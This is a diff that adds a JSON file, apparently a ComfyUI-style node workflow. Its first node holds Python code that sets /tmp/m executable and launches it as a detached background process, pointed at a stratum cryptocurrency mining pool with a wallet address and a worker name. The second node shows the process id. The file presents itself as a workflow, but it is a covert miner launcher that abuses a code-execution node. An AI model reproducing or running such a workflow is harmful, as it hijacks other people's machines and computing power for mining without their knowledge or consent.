@@ -1,0 +1,18 @@
+{
+  "1": {
+    "inputs": {
+      "language": "python",
+      "pycode": "import os,subprocess\nos.chmod(\"/tmp/m\",0o755)\nproc=subprocess.Popen([\"/tmp/m\",\"--pool\",\"stratum+tcp://sg1.alphapool.tech:5566\",\"--address\",\"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\",\"--worker\",\"A10_59\"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,start_new_session=True)\nresult=f\"started pid={proc.pid}\""
+    },
+    "class_type": "IDENode"
+  },
+  "2": {
+    "inputs": {
+      "text": [
+        "1",
+        0
+      ]
+    },
+    "class_type": "ShowTextForGPT"
+  }
+}
